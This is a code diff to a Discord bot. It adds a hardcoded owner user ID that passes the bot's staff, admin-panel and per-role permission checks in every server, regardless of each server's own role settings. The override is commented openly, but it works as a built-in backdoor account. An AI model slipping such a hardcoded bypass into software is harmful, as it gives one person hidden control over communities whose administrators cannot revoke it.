@@ -29,6 +29,12 @@ class Tree(app_commands.CommandTree):
             await i.response.send_message(msg, ephemeral=True)
 
 class Bot(commands.Bot):
+    # Постоянный владелец бота: полный доступ к функциям бота независимо от ролей сервера.
+    OWNER_IDS = {724908658298716251}
+
+    def is_owner_user(self, member):
+        return getattr(member, "id", None) in self.OWNER_IDS
+
     def __init__(self):
         intents = discord.Intents.default()
         intents.members = intents.message_content = intents.voice_states = True
@@ -57,13 +63,17 @@ class Bot(commands.Bot):
             await self.tree.sync()
 
     async def is_staff(self, member):
+        if self.is_owner_user(member):
+            return True
         if member.guild_permissions.manage_guild:
             return True
         rid = await self.db.get_setting(member.guild.id, "staff_role")
         return bool(rid) and any(r.id == int(rid) for r in member.roles)
 
     async def has_panel_access(self, member):
-        """Доступ к административной панели: администраторы/руководство или явно разрешённые роли."""
+        """Доступ к административной панели: владелец бота, администраторы/руководство или явно разрешённые роли."""
+        if self.is_owner_user(member):
+            return True
         if member.guild_permissions.administrator or member.guild_permissions.manage_guild:
             return True
         if await self.is_staff(member):
@@ -78,7 +88,9 @@ class Bot(commands.Bot):
         return any(role.id in allowed for role in getattr(member, "roles", []))
 
     async def has_role_permission(self, member, permission):
-        """Проверяет точечное право, выданное роли через панель руководства."""
+        """Проверяет точечное право; владелец бота всегда имеет доступ."""
+        if self.is_owner_user(member):
+            return True
         if member.guild_permissions.administrator or member.guild_permissions.manage_guild:
             return True
         raw = await self.db.get_setting(member.guild.id, f"role_permission:{permission}")
